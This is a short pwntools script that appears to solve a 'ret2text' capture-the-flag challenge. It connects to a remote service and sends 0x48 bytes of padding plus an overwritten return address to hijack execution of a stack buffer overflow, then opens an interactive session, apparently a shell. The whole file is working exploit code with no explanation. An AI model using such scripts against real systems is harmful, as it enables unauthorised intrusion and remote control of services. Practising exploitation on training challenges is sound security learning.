from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("./ret2text")
#sleep(5)
#s=remote("8.130.35.16",51002)
s=remote("192.168.3.253",51002)
s.recv()
s.send(b"a"*0x48+p64(0x401298))
s.interactive()
